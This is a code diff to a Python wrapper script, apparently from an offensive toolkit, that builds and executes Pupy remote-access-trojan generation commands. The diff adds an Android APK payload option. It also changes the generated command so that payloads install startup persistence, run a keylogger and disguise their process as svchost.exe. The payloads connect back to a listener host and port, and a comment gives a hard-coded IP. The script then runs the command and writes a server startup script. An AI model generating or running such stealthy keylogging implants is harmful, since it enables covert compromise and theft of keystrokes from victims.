@@ -20,8 +20,9 @@ format_Dict = {
     '4': 'py_oneliner',
     '5': 'ps1',
     '6': 'ps1_oneliner',
-    '7': 'rubber_ducky'
-    }
+    '7': 'rubber_ducky',
+    '8': 'apk'
+}
 
 # New syntax format Pupy Generator is...
 # python pupygen.py -f client -O windows --randomize-hash connect --host 52.53.180.45:443
@@ -33,8 +34,9 @@ format_List = [
     '4 One-Liner HTTP Download-to-Memory Payload',
     '5 ps1 Powershell script, injects a pupy dll into a current process',
     '6 ps1 Remote Download Powershell-to-Pupy script',
-    '7 Rubber Ducky Script and Injection binary file'
-    ]
+    '7 Rubber Ducky Script and Injection binary file',
+    '8 Generate a Android-Compatible Pupy APK installer'
+]
 #
 
 transport_Dict = {
@@ -110,7 +112,14 @@ Transport_Chosen = transport_Dict[Transport_Type]
 # root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 52.53.180.45:443
     # assigns all the file extension types
 Format_Chosen = Format_Chosen
-
+if Format_Chosen == 'client':
+    # this is a subdirectory for anything for Option #1 "client", they have a Windows, Linux, and Android option
+    if Operating_System == 'windows':
+        file_extension = 'exe'
+    if Operating_System == "linux":
+        file_extension = 'lin'
+    if Operating_System == "android":
+        file_extension = 'apk'
 if Format_Chosen == 'py':
     file_extension = 'py'
 if Format_Chosen == 'pyinst':
@@ -119,22 +128,7 @@ if Format_Chosen == "ps1":
     file_extension = "ps1"
 if Format_Chosen == "apk":
     file_extension = "apk"
-# need to make separate command strings
-
-if Operating_System == 'windows':
-    file_extension = 'exe'
-if Operating_System == "linux":
-    file_extension = 'lin'
-if Operating_System == "android":
-    file_extension = 'apk'
-    Format_Chosen = 'client'
-if Format_Chosen == 'py':
-    file_extension = 'py'
-if Format_Chosen == 'pyinst':
-    file_extension = 'py'
-if Format_Chosen == "ps1":
-    file_extension = "ps1"
-cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
+cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -s persistence,method=startup -s keylogger -s hide_argv,name=svchost.exe -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
     Format_Chosen, # 0
     Operating_System, # 1
     Architecture_Value, #2
@@ -147,33 +141,8 @@ cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/Ar
     host_Port, # 9
     Transport_Chosen # 10
 
-    )
-# if Format_Chosen != 'client': # if not equal client....
-#     if Format_Chosen == 'apk':
-#
-#         Operating_System = 'android'
-#         cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -s persistence,method=registry -s keylogger -s hide_argv,name=svchost.exe -s daemonize -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
-#             Format_Chosen, # 0
-#             Operating_System, # 1
-#             Architecture_Value, #2
-#             Format_Chosen, #3
-#             Operating_System, # 4
-#             Architecture_Value, # 5
-#             Transport_Chosen, # 6
-#             file_extension, # 7
-#             host_Connectback, # 8
-#             host_Port, # 9
-#             Transport_Chosen # 10
-#
-#         )
-    # if Format_Chosen == 'py':
-    #     file_extension = 'py'
-    # if Format_Chosen == 'pyinst':
-    #     file_extension = 'py'
-    # if Format_Chosen == "ps1":
-    #     file_extension = "ps1"
-    # if Format_Chosen == "apk":
-    #     file_extension = "apk"
+)
+
 print colored(cmd_String,'red','on_white')
 os.system(cmd_String)
 # payload_dir = '/root/ArmsCommander/payloads/'
@@ -190,13 +159,6 @@ print 'Remember all of this when you are going to start up your listener, handle
 # Autostart Script for Listener
 # Generates a script file that will run Pupy Server with the correct parameters
 pupy_installation_path = '/root/pupy/pupy'
-
-
-# new bug, for the startup script it no longer works. Even though the syntax is the same. Must be manually started.
-# configuration
-# scramblesuit
-# port 443
-
 premade_startup_script_string = "sudo python /root/pupy/pupy/pupysh.py -t " + transport_Dict[Transport_Type] + ' -p ' + host_Port
 premade_startup_script_location = "/root/ArmsCommander/payloads/pupy_server_startup.sh"
 saved_startup_file = open(premade_startup_script_location, 'w')
